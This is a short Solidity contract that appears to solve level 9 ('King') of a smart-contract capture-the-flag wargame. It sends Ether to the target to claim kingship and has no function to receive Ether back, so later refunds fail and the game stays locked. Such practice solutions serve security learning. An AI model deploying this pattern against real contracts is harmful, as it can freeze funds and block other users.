// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract KingMaker {
    constructor(address target) payable {
        require(msg.value >= King(payable(target)).prize(), "Not enough Ether to become king");

        (bool success,) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }
}
